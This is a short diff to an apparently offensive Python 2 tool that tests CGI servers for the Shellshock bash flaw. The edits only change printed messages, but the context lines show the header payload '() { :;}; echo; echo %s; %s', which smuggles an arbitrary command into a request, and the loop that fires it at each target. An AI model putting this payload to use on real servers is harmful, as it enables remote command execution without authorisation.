@@ -156,7 +156,10 @@ def exploit_cgi(proxy, target_list, exploit, verbose):
        "Content-typo": "() { :;}; echo; echo %s; %s" % (success_flag, exploit)
        }
 
-    print "[+] %i potential targets found" % len(target_list)
+    if len(target_list) > 1:
+        print "[+] %i potential targets found" % len(target_list)
+    else:
+        print "[+] 1 potential target found"
     print "[+] Attempting exploits..."
     for target in target_list:
         print "\n[+] Trying exploit for %s" % target 
@@ -345,7 +348,7 @@ def main():
         thread_pool = threading.BoundedSemaphore(args.threads)
     if args.cgi is not None:
         cgi_list = [args.cgi]
-        print "[+] Single target %s being used" % cgi_list[0]
+        print "[+] Single target '%s' being used" % cgi_list[0]
     else:
         cgi_list = import_cgi_list_from_file(args.cgilist)
 
